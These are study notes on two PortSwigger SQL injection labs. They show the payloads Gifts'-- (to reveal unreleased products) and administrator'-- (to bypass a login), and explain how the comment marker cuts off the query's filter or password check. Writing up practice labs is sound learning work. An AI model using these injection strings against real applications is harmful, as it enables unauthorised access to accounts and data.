# SQL Injection Labs 

## Lab 1: Retrieve hidden data

**Link:** (https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

### Assumption:



### Example query

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
```sql
SELECT * FROM products WHERE category = 'Gifts'-- ' AND released = 1
```

### Injection concept

```sql
category=Gifts'--
```
`--` comments out `AND released = 1`so `released` filter never runs showing unreleased products too



## Lab 2: SQL injection: Authentication bypass

**Link:**(https://portswigger.net/web-security/sql-injection/lab-login-bypass)

### Assumption:

- username: administrator

### Example query

```sql
SELECT * FROM users
WHERE 
username ='fu_94' AND password = '123';
```
```sql
SELECT * FROM users
WHERE username ='administrator'-- AND password = '123'
```

### Injection concept

```sql
administrator'--
```
The attcker can login as any user by removing the password check from the WHERE clause : 
since the double dash is a comment indicator in SQL, the rest of the query is commented out.
